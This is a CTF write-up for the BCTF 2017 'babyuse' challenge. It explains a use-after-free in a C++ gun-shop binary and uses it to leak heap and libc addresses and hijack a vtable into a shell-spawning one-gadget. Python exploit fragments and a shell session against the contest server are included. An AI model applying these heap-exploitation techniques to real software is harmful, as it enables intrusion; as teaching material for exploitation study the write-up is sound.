# BCTF 2017 - pwn - babyuse

> babyuse
> nc 202.112.51.247 3456

> Attachment: [babyuse](babyuse) [libc.so](libc.so) [xpl.py](xpl.py)
>

# Write-up

```
 _                                         
|_)_. _ _o _ ._  |  _  _. _| _  /\ ._ _    
| (_|_>_>|(_)| | |_(/_(_|(_|_> /--\| | |\/ 
                                        /  

Menu:
1. Buy a Gun
2. Select a Gun
3. List Guns
4. Rename a Gun
5. Use a Gun
6. Drop a Gun
7. Exit
```

The babyuse service acted like a small weapon shop. You could buy some guns, use, rename and drop them. Seemed likely that this had to be some use-after-free challenge.

When buying a gun, it allocates memory, initializes the gun and puts it in a `gunTable` array. It also sets a flag in a `gunInUse` array, which will probably be used later on, to check, if the corresponding gun in the `gunTable` array is initialized.

From the initialization method for the gun

```
struct gunStruct *__cdecl initQSZ92(struct gunStruct *a1)
{
  struct gunStruct *result; // eax@1

  sub_1540((struct gunInfo *)a1);
  a1->vPtr = (int)vtableQSZ92;
  a1->MaxAmmo = 15;
  a1->CurAmmo = 15;
  result = a1;
  a1->Name = 0;
  return result;
}
```

we can assume, that the guns are implemented as inherited classes from some "base gun" like:

```c
class BaseGun {
public:
	int MaxAmmo;
	int CurAmmo;
	
	virtual void Shoot() {}
	virtual void Reload() {}
	virtual void ShowInfo() {}	
};

class QSZ92 : public BaseGun {
public:
	void Shoot() {
		if (CurAmmo) {
			puts("BIU~");
			--CurAmmo;
		}
		else {
			puts("CRACK~");
		}
	}
	
	void Reload() {
		CurAmmo = MaxAmmo;
	}
};

class QBZ95 : public BaseGun {
public:
	void Shoot() {
		if (CurAmmo) {
			puts("BANG~");
			--CurAmmo;
		}
		else {
			puts("CRACK~");
		}
	}
	
	void Reload() {
		CurAmmo = MaxAmmo;
	}
};
...
```

To choose the correct function to call at runtime, C++ uses vtables. Each inherited class contains a pointer to a vtable, which is basically an array of function pointers, that point to the corresponding functions for the instantiated class type. 

When a virtual function gets called, it will get the vtable ptr from the object, adds the offset of the function pointer and calls the method at the address, that's stored there.

```asm
mov     eax, [ebp+selectedGun]	; get vtable pointer
mov     eax, [eax]				
add     eax, 4			; add offset for Reload()
mov     eax, [eax]		; get function pointer from there
sub     esp, 0Ch
push    [ebp+selectedGun]
call    eax			; call Reload()
```

So, if we'd be able to overwrite the vtable pointer for a class, we could craft a function pointer array and let the vtable point to that one. When the application then tries to call one of the virtual functions, it would call our injected function instead.

But how can we accomplish this? Well, the service stores the currently selected gun in a global variable, let's call it `SelectedGun`. And in most of the functions, the binary validates, if the guns are allocated correctly by checking the `gunInUse` array. If a gun is "dropped", it will get free'd and the corresponding entry in `gunInUse` will be set to 0.

```c
int dropGun()
{
  int result; // eax@4
  struct gunStruct *v1; // ST1C_4@5
  int v2; // [sp+8h] [bp-10h]@1

  puts("Choose a gun to delete:");
  v2 = readNumber();
  if ( v2 <= 3 && v2 >= 0 && gunInUse[v2] )
  {
    v1 = (struct gunStruct *)gunTable[v2];
    free((void *)v1->Name);
    operator delete(v1);
    gunInUse[v2] = 0;
    result = puts("Deleted");
  }
  else
  {
    result = puts("Wrong input");
  }
  return result;
}
``` 

But this won't reset the `SelectedGun`, so we could have a gun selected, which just has been free'd. To make this even better, the `UseGun` method doesn't check the `gunInUse` array, to see if the currently selected gun is still allocated, so we have an use-after-free, just wating to get exploited.

```c
int useGun()
{
...
  	currentGun = (struct gunStruct *)gunTable[SELECTEDGUN];
  	
  	printf("Select gun %s\n", selectedGun->Name);	// Leak
  	puts("1. Shoot");
  	puts("2. Reload");
  	puts("3. Info");
  	puts("4. Main menu");
  
	readUntil(0, (int)nptr, 32, 10);
	selFunction = atoi(nptr);

	switch(v1) {
		case 1: (*(void (__cdecl **)(struct gunStruct *))currentGun->vPtr)(selectedGun); break;
		case 2: (*(void (__cdecl **)(struct gunStruct *))(currentGun->vPtr + 4))(selectedGun); break;
		case 3: (*(void (__cdecl **)(struct gunStruct *))(currentGun->vPtr + 8))(selectedGun); break;
	}
...
}
```

This function gives us a possible leak with the name of the gun (which might be free'd and thus containing a heap pointer), and as soon as we'll be able to overwrite the vtable pointer, it will also execute our payload.

So let's first leak a heap address, which we'll need to calculate the address, where our fake vtable will be stored. For this we'll create a *small* gun (fastbin size).

```python
def exploit(r):
	r.recvuntil("Exit\n")
	
	buy(1, 10, "AAAABBBBCC")

	renamegun(0, 8, "AAAABBB")

	dropgun(0)

	HEAPLEAK = u32(usegun(0)[len("Select gun "):-4])
```

This will buy a gun, initializing the gun to

```
0x58075a00:	0x00000000	0x00000000	0x00000000	0x00000019
0x58075a10:	0x5664ed30	0x58075a28	0x0000000f	0x0000000f
0x58075a20:	0x00000000	0x00000011	0x41414141	0x42424242  <-- Name
0x58075a30:	0x00000043	0x000205d1	0x00000000	0x00000000
```

Renaming the gun will free the memory for the name, putting it in the fastbin list, and allocate another memory area for the new name

```
0x58075a00:	0x00000000	0x00000000	0x00000000	0x00000019
0x58075a10:	0x5664ed30	0x58075a38	0x0000000f	0x0000000f
0x58075a20:	0x00000000	0x00000011	0x00000000	0x42424242 <-- Old name
0x58075a30:	0x00000043	0x00000011	0x41414141	0x00424242 <-- New name
0x58075a40:	0x00000000	0x000205c1	0x00000000	0x00000000
```

Dropping the gun will then free the new name also, putting this one in the fastbin list, and the address of the previous fastbin in it's FD pointer.

```
0x58075a00:	0x00000000	0x00000000	0x00000000	0x00000019
0x58075a10:	0x00000000	0x58075a38	0x0000000f	0x0000000f
0x58075a20:	0x00000000	0x00000011	0x00000000	0x42424242
0x58075a30:	0x00000043	0x00000011	0x58075a20	0x00424242 <-- New name (with FD pointing to old name)
0x58075a40:	0x00000000	0x000205c1	0x00000000	0x00000000
```

Since this gun is still *selected*, we can still *use* it, which will show it's name, containing the address of the old name on the heap. So we have a heap address to start with. But to calculate the needed libc offsets, we'd need a leak for a libc address also. 

Well, we can get it the same way, just allocating a gun with a bigger name this time, so it won't be put in fastbin list. Thus we'll get a FD pointer to main_arena when dropping this one.

```python
	buy(1, 256, "AAAABBBB")	# 0
	buy(1, 256, "CCCCDDDD")	# 1
	
	dropgun(0)

	LIBCLEAK = u32(usegun(0)[len("Select gun "):len("Select gun ")+4])
	LIBC = LIBCLEAK - 0x1b27b0

	info("LIBC leak        : %s" % hex(LIBCLEAK))
	info("LIBC base        : %s" % hex(LIBC))
```

Now let's create a fake vtable, which contains something more useful (for us) than *BIU~*. A function pointer to a magic gadget, that opens a shell might be more helpful:

```
	ONE = LIBC + 0x3ac69		
	HEAPDEST = HEAPLEAK + 0x2c 

	info("One gadget       : %s" % hex(ONE))
	info("HEAP destination : %s" % hex(HEAPDEST))
	
	payload = "AAAA"
	payload += p32(ONE)			# VTable Shoot
	payload += "CCCC"			# VTable Reload
	payload += "DDDD"			# VTable ShowInfo
	payload += "EEEE"

	buy(1, 32, payload)			# 0
```

*HEAPDEST* will contain the address, where this vtable is stored on the heap (Name + 4 bytes). So, *all* we'll have to do, is to create a gun, which uses this vtable. Again the *use-after-free* will help us with this.

The size of a gun class is 20 bytes. If we allocate 3 guns with a name 32 bytes long, each one will allocate 20 bytes for itself and 32 bytes for its name.

```
0x5655ea60:	0x00000000	0x00000000	0x00000000	0x00000019  
0x5655ea70:	0x56556d30	0x5655ea88	0x0000000f	0x0000000f  <-- Gun (vtable / name ptr / curAmmo / maxAmmo)
0x5655ea80:	0x00000000	0x00000029	0x58585858	0x59595959  <-- Name
0x5655ea90:	0x00000000	0x00000000	0x00000000	0x00000000
0x5655eaa0:	0x00000000	0x00000000	0x00000000	0x00000019  
0x5655eab0:	0x56556d30	0x5655eac8	0x0000000f	0x0000000f  <-- Gun (vtable / name ptr / curAmmo / maxAmmo)
0x5655eac0:	0x00000000	0x00000029	0x45454545	0x46464646  <-- Name
0x5655ead0:	0x00000000	0x00000000	0x00000000	0x00000000
```

When we now free (drop) those guns, the gun classes will be put in fastbinsY[1], while the freed name chunks will be put into fastbinsY[3].

```
	payload = "AAAA"
	payload += p32(ONE)			# VTable Shoot
	payload += "CCCC"			# VTable Reload
	payload += "DDDD"			# VTable ShowInfo
	payload += "EEEE"

	buy(1, 32, payload)			# 0
	buy(1, 32, "XXXXYYYY")			# 2
	buy(1, 32, "EEEEFFFF")			# 3	
	
	selectgun(2)
	
	dropgun(0)		
	dropgun(2)
	dropgun(3)
```

```c
fastbinsY[1] : Gun 3  --> Gun 2  --> Gun 1
fastbinsY[3] : Name 3 --> Name 2 --> Name 0
```

Now allocating a gun with a name only 16 bytes long, will result in malloc using the chunk *Gun3* to allocate the memory for the new gun, and chunk *Gun2* for the name of our new gun, since its size also matches that of fastbinsY[1].

Thus creating this new gun will result in overwriting the class information of gun 2 with the name of our new gun and with it, its precious vtable ptr. 

With this we can overwrite it with the address of our previously created fake vtable, which contains the address of our magic gadget.

```python
	payload = p32(HEAPDEST)		# new vtable ptr
	payload +=  p32(HEAPDEST)
	
	buy(1, 16, payload)	
	
	usegun(1, False)
```

Sine gun 2 is still selected, all that's left is to *shoot* with it, which will then use our fake vtable to calculate the function address to call, which happens to be our magic gadget.

```
$ python xpl.py 1
[+] Opening connection to 202.112.51.247 on port 3456: Done
[*] Heap leak        : 0x567c9a20
[*] LIBC leak        : 0xf75d07b0
[*] LIBC base        : 0xf741e000
[*] One gadget       : 0xf7458c69
[*] HEAP destination : 0x567c9a4c
[*] Switching to interactive mode
$ cat flag
bctf{ec1c977319050b85e3a9b50d177a7746}
```
